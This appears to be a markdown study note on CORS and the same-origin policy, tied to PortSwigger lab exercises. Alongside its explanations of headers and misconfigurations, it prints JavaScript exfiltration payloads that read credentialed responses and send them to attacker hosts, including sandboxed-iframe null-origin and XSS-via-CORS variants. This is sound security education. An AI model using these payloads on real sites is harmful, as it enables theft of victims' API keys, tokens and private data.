# Cross Origin Resource Sharing(CORS)
![](https://github.com/DK9510/Img/blob/main/CORS.png)

## what is CORS
- cross origin resource sharing is a browser mechanism which enables controlled access to resource located outside of a given domain.
- it extends and adds flexibility to the `SOP(same origin policy)`.
- it also provide Potential for cross domain based attacks. 
- if websites cors policy is poorly configured or implement that not protect against cross origin attacks such as `CSRF`
## Same origin policy
- it is restrictive cross-origin specification that limits the ability for a website to interact with resource outside of the source domain.
- it generally allows domain to issue request to other domain to issue request to other domains ,but not to access the response

## why same origin policy is necessary
- When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request.
- This means that the response will be generated within the user's session, and include any relevant data that is specific to the user. Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc

## relaxation of the same-origin policy
- The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints.
- Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
- `CORS` protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.
- These are combined inn a header exchange between a browser and the cross-origin web site that is trying to access.

# CORS and the Access-Control-Allow-Origin response header
## Access-Control-Allow-Origin Response header
- `Access-Control-Allow-Origin` header is included in the responses from one website to request originating from another website, and identifies the permitted origin of the request.
- browser compares `Access-Control-Allow-Origin` with requesting website's origin and permits access to the response if they match.

## Implementing Simple Cross Origin Resource Sharing 
- `CORS` specification prescribe header content exchanged between browsers and web servers that restricts origins for web resource requests outside of the origin domain.
- CORS's specification identifies a collection of protocol headers like `Access-Control-Allow-Origin` which is most significant.
- `example: `web with origin:`normalweb.com` cause the cross domain request:
```js
GET /data HTTP/1.1
Host: robust-web.com
Origin: http://normalweb.com
```
server response to this 
```js
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: http://normalweb.com
```

## Handling Cross-origin Resource request with credentials
- default behavior of CORS is request to be passed without `credentials` like `Cookies` and `Authorization` header.
- but some cross-domain server can permit reading of the response when credentials are passed to it by setting CORS`Access-Control-Allow-Credentials  header ` now requesting website use `JS` to declare cookie with the request.
```JS
GET /data HTTTP/1.1
Host: robustweb.com
...
Origin: https://normalweb.com
Cookie: JSESSIONID=er34r345546t34t
```
and Response will
```js
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normalweb.com
Access-Control-Allow-Credentials: true
```
 browser will permit the requesting website to read the response, because the `Access-Control-Allow-Credentials` response header is set to `true`. Otherwise, the browser will not allow access to the response.
 
## Relaxation of CORS specifications with wildcards
- header `Access-Control-Allow-Origin: *` supports use of wild cards
- `Note:`Note that wildcards cannot be used within any other value. For example, the following header is **not** valid:
```js
Access-Control-Allow-Origin: https://*.normal-website.com
```

- due to security perspective use of wild-card is restricted in the in the specification as we can't combine cross origin transfer of credentials(auth, cookies etc)
 ```js
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
 ``` 
 this is dangerously insecure and also exposing any authenticated content on the target site to everyone
 - some web-servers dynamically create `Access-Control-Allow-Origin` header based upon the client-specified origin. and it can be `exploited`

## Pre-flight checks
- it was added to the CORS specification to protect legacy resources from the expanded request options allowed bu CORS.
- when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check.
- The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.
```js
OPTIONS /data HTTP/1.1
Host: https://web.com
...
Origin: http://normalweb.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: special-request-header
``` 
response
```js
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com  
Access-Control-Allow-Methods: PUT, POST, OPTIONS  
Access-Control-Allow-Headers: Special-Request-Header  
Access-Control-Allow-Credentials: true  
Access-Control-Max-Age: 240
```

# vulnerability Arise from CORS configuration issue.
 
## server-generated ACAO(access-control-allow-origin) header from client-specified origin header
- some application need to provide access to a number of other domains. 
- Maintaining a list of allowed domains require ongoing effort and Mistakes risk breaking functionality.
- so some applications take the easy route of effectively allows access from any other domain.

one simple method is read `origin` header form request and including a response header stating that the requesting origin is allowed access from any other domain
```js
GET /sensitive-info HTTP/1.1
Host: vuln-web.com
Origin: http://malicious-web.com
Cookie: sessionod=2354654edfg
```
responded with
```js
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://malicious-web.com
Access-Control-Allow-Credentials: true
```

- these header state that access is allows from the requesting domain(`malicious.com`) and that the cross-domain request can include cookies.
- since the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. 
- if response contain some `sensitive info` such as `API keys or CSRF token`, we retrieve them by crafting special script and Host in `malicious.com`
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://vuln-web.com/senditive-info',true);
req.withCredentials = true;
req.send();

function reqListener(){
location='//malicious.com/log?key='+this.responseText;
};
```
- `Note:` here this is same as CSRF, in CSRF attack we execute some operation from the user, in `CORS` we just forcefully request some data with our `attacker.domain origin header` so we retrieve the response from and steal sensitive info of the victim such as `API key, CSRF token, Auth token etc`

## Errors parsing Origin headers
- some applications that support access from multiple origins do so by using a whitelist of allowed origins.
- when a CORS request is received, the supplied origin is compared to the whitelist, if the origin appears on the whitelist then it is reflected in the `ACAO` header so that access is granted.
- `example:` 
```js
GET /data HTTP/1.1 
Host: normalweb.com
...
Origin: http://innocent-web.com
```
here the application checks the supplied origin against its list of allowed origins and if it is on the list, reflects the origin as
```js
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: http://innocent-web.com
```

- Mistakes arise when Implementing `CORS` origin whitelist. 
- some organization decide to allow access from all their subdomains(including future subdomain yet not in existence).
- some applications allow access from various other organizations's domains including their SUbdomains.
- these rules often implemented by matching `URL prefixes or Suffixes or using regular expressions `, any mistakes in the implementation can lead to access being granted to unintended external domains
- `Example: ` application grants access to all domains ending `normalweb.com` 
`Bypass:` `hackersnormalweb.com` easily bypassed 
- `Example2: ` application grants access to all domains beginning with `normalweb.com` `Bypass:` `normalweb.com.evil-user.com`

### Whitelisted Null Origin Value
- origin header supports `null` value, and browsers might send the value `null` in the origin header in various unusual situation.
	1. Cross-site Redirects
	2. Request from serialized data
	3. Request using the `file:` protocol
	4. Sandboxed cross-origin request
- some application whitelist the null origin to support local development of the application.
-`Example:` application receive cross-domain request
```js
GET /sensitive-data HTTP/1.1
Host: vuln-web.com
Origin: null
```
got response
```js
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Conteol-Allow-Credentials: true
```
- attacker cab use various tricks to generate a cross-domain request containing null in `Origin` header by various method
`Example:`   by doing `Sandboxed iframe` cross-origin request of the form
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req= new XMLHttpRequest();
req.onload= reqListener;
req.open('get','vuln-web.com/sensitive-data',true);
req.withCredentials = true;
req.send();

function reqListener()
{location='attacker.com/log?key='+this.responseText;
};
</script>"> </iframe>
```

alternate exploit form
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>  
   var req = new XMLHttpRequest();  
   req.onload = reqListener;  
   req.open('get','$url/sensitive-info',true);  
   req.withCredentials = true;  
   req.send();  
  
   function reqListener() {  
       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);  
   };  
</script>"></iframe>
```
 
## Exploiting XSS via CORS trust relationships
- if CORS Configured to establish trust relationship between `Two Origins`, and if a web app trusts an `Origin` that is `vulnerable to XSS`.
- Then an attacker can exploit `XSS` to inject some `JS` that uses `CORS` to Retrieve sensitive information from the site that trust the vulnerable application.
- `Example: ` 
request
```js
GET /api/requestApiKey HTTP/1.1
Host: vuln-web.com
Origin: https://subdomain.vuln-web.com
Cookie: sessionID=34erjf4kh5i34hw5yri
```
and server Responds with
```js
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://subdomain.vuln-web.com
Access-Control-Allow-Credentials: true
```
- then attacker find `XSS` on subdomain.vuln-web.com & use that to retrieve `ApiKey` using URL like
```js
https://subdomain.vuln-web.com/?xss=
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://vuln-web.com/senditive-info',true);
req.withCredentials = true;
req.send();

function reqListener(){
location='//attackerdomain.com/?key='+this.responseText;</script>
```
or another exploit for `CORS using XSS`
```js
<script>
document.location="http://stock.acca1fa91f3524af80e8305a00a9006a.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://acca1fa91f3524af80e8305a00a9006a.web-security-academy.net/accountDetails','true');req.withCredentials = true;req.send();function reqListener(){ location='https://acbc1f361f42242980a630bc01ba0080.web-security-academy.net/log/?key='%2bthis.responseText;};%3c/script>&storeId=1"
</script>
```

## Intranets and CORS without Credentials
- most of the `CORS attacks` relay on the presence of the response header:
`Access-Control-Allow-Credentials: true`
- without that header, the victim user's browser will refuse to send their `Cookies`, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to application
- however, there is one common situation when attacker can't access a website directly i.e `when its part of organization's intranet or only accessible from internal network`
- `Example:` request from the internal network
```js
GET /reader?url=doc1.pdf
Host: intranet.normal-web.com
Origin: https://normal-web.com
```
and server responds
```js
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
- if application server is trusting resource request form any origin without credentials 
- if users within the private IP have access to the public internet then `CORS-Based attack` can be performed from the external site that uses the victim's browser as a proxy for accessing `intranet resource or inteally-hosted stuff`
 
### CORS vulnerability with internal network Pivot Attack
- `Note:` this exploitation is expert level, 
- reference portswigger lab
 [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
 # How to Prevent CORS-based Attacks
 - make proper configuration of cross-domain requests.
 - only allow trusted sites.
 - Avoid Whitelisting Null.
 - Avoid Wildcards(\*) in internal networks
 
